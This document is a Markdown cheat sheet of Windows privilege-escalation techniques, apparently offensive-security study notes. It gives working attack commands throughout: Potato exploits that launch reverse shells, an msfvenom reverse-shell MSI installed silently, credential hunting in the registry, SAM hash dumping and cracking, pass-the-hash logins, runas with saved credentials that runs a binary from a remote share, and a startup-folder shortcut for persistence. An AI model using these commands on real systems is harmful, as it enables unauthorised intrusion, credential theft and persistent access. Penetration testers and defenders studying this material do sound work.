# Windows Privilege Escalation

## 1. User & Privilege Information

### Current User
```bash
whoami
```

### User Groups
```bash
net user <username>
```

### All Users
```bash
net user
```

### Special Privileges
```bash
whoami /priv
```

- [More details](https://github.com/hatRiot/token-priv)
- SeImpersonatePrivilege, SeAssignPrimaryPrivilege: Juicy Potato
- SeBackupPrivilege: Read any file (SAM/SYSTEM/registry)
- SeRestorePrivilege: Write any file, overwrite binaries/DLLs
- SeTakeOwnershipPrivilege: Take ownership, gain write access
- SeDebugPrivilege: If disabled, bypass with RunasCs.exe

---

## 2. System Information

### Machine Name
```bash
hostname
```

### OS Info
```bash
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Type" /B
```

---

## 3. Processes & Services

### Running Processes
```bash
tasklist /SVC
```

### Services
To exploit a service, you must be able to interact with it (stop/start or auto-start).

#### Service Configuration
```bash
sc.exe qc <name>
```

#### Query Service Status
```bash
sc.exe query <name>
```

#### Modify Service Config
```bash
sc.exe config <name> <option>= <value>
```

#### Stop or Start a Service
```bash
net stop <name>
net start <name>
```

#### Possible Misconfigurations
- Insecure Service Properties
- Unquoted Service Path
- Weak Registry Permissions
    - `Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List`
    - `./accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`
- Insecure Service Executables
- DLL Hijacking (use procmon to check file accesses, look for missing DLLs)

---

## 4. Network & Firewall

### Network Adapters
```bash
ipconfig /all
```

### Routes
```bash
route print
```

### Connections
```bash
netstat -ano
```

### Open Ports
```bash
netstat -tulpn
```

### Firewall Status
```bash
netsh advfirewalls show currentprofile
```

### Firewall Rules
```bash
netsh advfirewalls firewall show rule name=all
```

---

## 5. Potato Exploits

Privileges needed: SeImpersonate / SeAssignPrimaryToken

- Simulate Service account reverse shell:
```bash
C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
```

### Hot Potato
- [Potato](https://github.com/foxglovesec/Potato)
- Works on Windows 7, 8, early 10
- Tricks OS to authenticate on HTTP, forwards hash to SMB, executes command
```bash
./potato.exe -ip 192.168.1.33 -cmd "C:\PrivEsc\reverse.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

### Juicy Potato
- [Juicy Potato](https://github.com/ohpe/juicy-potato)
- Works on Windows 7
```bash
C:\PrivEsc\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

If the CLSID ({03ca...) doesn’t work, check this list:
```bash
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```
Or run the GetCLSID.ps1 PowerShell script.

### Rogue Potato
- [Rogue Potato](https://github.com/antonioCoco/RoguePotato)
- [Compiled](https://github.com/antonioCoco/RoguePotato/releases)
- [Blog](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

Start tunnel on Kali:
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET_IP>:9999
```

On the server, run the Rogue potato:
```bash
C:\PrivEsc\RoguePotato.exe -r <KALI_IP> –l 9999 -e "C:\PrivEsc\reverse.exe"
```

### PrintSpoofer
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [Blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)

```bash
C:\PrivEsc\PrintSpoofer.exe –i - c "C:\PrivEsc\reverse.exe"
```

---

## 6. Passwords

### Registry
```bash
.\winPEASany.exe quiet filesinfo userinfo
```

Find passwords stored in the registry:
```bash
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Once we have creds, log in from Kali:
```bash
winexe -U 'admin%password123' //$IP cmd.exe
```
Or have a system shell if you have an admin user:
```bash
winexe -U 'admin%password123' --system //$IP cmd.exe
```

### Saved Credentials
```bash
.\winPEASany.exe quiet cmd windowscreds
```
```bash
cmdkey /list
```

To Exploit, use runas:
```bash
runas /savecred /user:admin C:\PrivEsc\reverse.exe
runas /user:Administrator /savecred "\\10.10.16.21\shares\rev.exe"
```

### Configuration Files
Config files can contain passwords, sometimes in clear text, sometimes in base64 etc.
```bash
.\winPEASany.exe quiet cmd searchfast filesinfo
```

Find Interesting files:
```bash
dir /s *pass* == *.config
```

Find files that contain password:
```bash
findstr /si password *.xml *.ini *.txt
```

Use win exe to log in.

### SAM/SYSTEM
SAM and SYSTEM are located in `C:\Windows\System32\config` but are locked while
the system is running.
Backups can be found in `C:\Windows\Repair` or
`C:\Windows\System32\config\RegBack`

* Use [Creddump7](https://github.com/Neohapsis/creddump7.git), `pwdump.py`
  to dump the hashes:
```bash
python2 ~/tools/creddump7/pwddump.py SYSTEM SAM
```

* If the NTLM hash starts with `31d6`, they are usually empty or disabled.

Crack the hashes with hashcat:
```bash
hashcat -m 1000 --force <HASH> /usr/share/wordlists/rockyou.txt
```

### PassTheHash
Using just the hashes to get admin shell:
```bash
pth-winexe -U 'admin%<LM>:<NTLM>' //$IP cmd.exe
```
Get a system shell using the hashes:
```bash
pth-winexei --system -U 'admin%<LM>:<NTLM>' //$IP cmd.exe
```

---

## 7. Scheduled Tasks
These will only be tasks visible to your user. You may be able to find it by
logging processes or looking for scripts that hint it is scheduled.

```bash
schtasks /query /fo LIST /v
wmic service get name,displayname,pathname,startmode |findstr /i "auto" \
|findstr /i /v "c:\windows”
```
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

---

## 8. Applications

Most privesc in Exploit DB is based on the common misconfigs. Focus on the
running processes for buffer overflows.
```bash
tasklist /v
```
```bash
.\seatbelt.exe NonstandardProcesses
```
```bash
.\winPEASany.exe quiet procesinfo
```

### Versions
```bash
wmic product get name, version, vendor
```

### Patches
```bash
wmic qfe get Caption, Description, HotFixId, InstalledOn
```

---

## 9. Writeable Files
```bash
accesschk.exe -uws “Everyone” c:\
```
```PowerShell
Get-ChildItem 'C:\' -recurse | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'users'} } catch {}}
```

---

## 10. Mounts and Drives
```bash
wmic logicaldisk get caption,description,providername
wmic logicaldisk get caption || fsutil fsinfo drives
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
mountvol
```

---

## 11. Drivers and Modules
```bash
driverquery.exe /v /fo csv  | convertFrom-CSV |  Select-Object
'Display Name', 'Start Mode', 'Path'
```
```bash
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, 
  Manufacturer | Where-Object {$_.DeviceName -like "VMware"}
```

---

## 12. Registry

### Autoruns
```bash
.\winPEASany.exe quiet applicationsinfo
```

Autoruns are defined in the registry and can be used if one of the apps are
writable.
```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

The output from above with access check can tell if a program is writable.
```bash
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

### Elevated Installs
```bash
.\winPEASany.exe quiet windowscreds
```

Look for `AlwaysInstallElevated  = 1`
```bash
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
```bash
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

Create a MSI:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$A_IP LPORT=445 -f msi -o shell.msi
```

Install the MSI:
```bash
msiexec /qn /i shell.msi
```
* `/qn` means no GUI

---

## 13. GUI Applications

If you have an app running as administrator:

* Confirm the use it is using by running:
```bash
tasklist /V | findstr mspaint.exe
```

* E.g., Paint: open the Open window and type the line to open a cmd shell as admin.
```bash
file://c:/windows/system32/cmd.exe
```

---

## 14. Startup Apps
Run at startup and can be used to get a shell when an Administrator logs in.

* Check permissions on:
  `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
```bash
.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

* Create a shortcut using vbscript:
```vbscript
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start
Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

* Run the script with:
```bash
cscript CreateShortcut.vbs
```

---

## 15. Tool List

### PowerUp
- [PowerUp](https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1)
```Powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

### SharpUp
Compiled PowerUp in C#.
- [SharpUp](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe)
```PowerShell
.\SharpUp.exe
```

### Seatbelt
- [Seatbelt](https://github.com/GhostPack/Seatbelt)
- [Seatbelt Compiled](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe)

For help:
```bash
.\seatbelt.exe
```
```bash
.\seatbelt.exe NonStandardServices
.\seatbelt.exe all
```

### WinPEAS
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

Enable Color in windows with, then reopen a new cmd:
```bash
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Run WinPEAS:
```bash
.\winPEAS.exe
```

---

## 16. Kernel Exploits

### wes
- [wes](https://github.com/bitsadmin/wesng)

* On the system:
```bash
systeminfo > sysinfo.txt
```

* On Attack machine:
```bash
wes -csysinfo.txt -e --hide "Internet Explorer" Edge Flash
wes -c systeminfo.txt -i 'Elevation of Privilege' --exploits
